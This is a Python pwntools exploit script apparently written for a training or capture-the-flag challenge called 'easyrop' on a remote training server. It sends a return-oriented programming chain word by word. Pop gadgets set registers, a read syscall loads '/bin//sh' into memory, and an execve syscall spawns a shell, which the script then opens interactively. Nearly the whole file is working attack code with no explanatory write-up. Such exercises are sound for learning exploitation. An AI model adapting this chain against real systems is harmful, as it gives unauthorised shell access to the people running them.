#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
'''
r = process("./easyrop")
gdb.attach(r, """
	b *0x00400291
	c
	""")
'''
r = remote("training.jinblack.it", 2015)
input("wait")

print(r.recvuntil("easyROP!\n"))

i = 0
while i < 14:
	r.send(p32(i))
	r.send(p32(i))
	print(r.recv(4))
	i = i+1

#first gadget to pop registers
r.send(p32(0x004001c2))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#rdi <-- fd
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

#rsi  <--pointer to var for /bin/sh
r.send(p32(0x00600370))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00000000))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#rdx <--count
r.send(p32(0x18))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

#rax <-- 0 for read
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#second gadget <-- call read
r.send(p32(0x004001b3))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#pop ebp <-- random value
r.send(p32(0x00000018))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x1a))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#third gadget to pop register
r.send(p32(0x004001c2))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#rdi <-- address of /bin/sh
r.send(p32(0x00600370))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x0))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

#rsi  <--address of pointer of /bin/sh
r.send(p32(0x00600380))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00000000))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#rdx <-- null
r.send(p32(0x00000000))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00000000))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)

#rax <-- 0x3b for execve
r.send(p32(0x3b))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#fourth gadget <--call sysexecve
r.send(p32(0x004001b3))
r.send(p32(0x0))
print(r.recv(4))
time.sleep(0.1)
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#pop ebp <-- random value
r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

r.send(p32(0x00))
r.send(p32(0x00))
print(r.recv(4))
time.sleep(0.1)

#send 2 null bytes to terminate the cycle
r.send("\x00")
time.sleep(0.1)
r.send("\x00")
time.sleep(0.1)
print(r.recv(4))

#send /bin/sh
r.send(b"/bin//sh\x00\x00\x00\x00\x00\x00\x00\x00\x70\x03\x60\x00")
time.sleep(0.1)

r.interactive()



#0x00000000004001c2 : pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
#0x00000000004001b3: syscall; nop; pop rbp; ret; 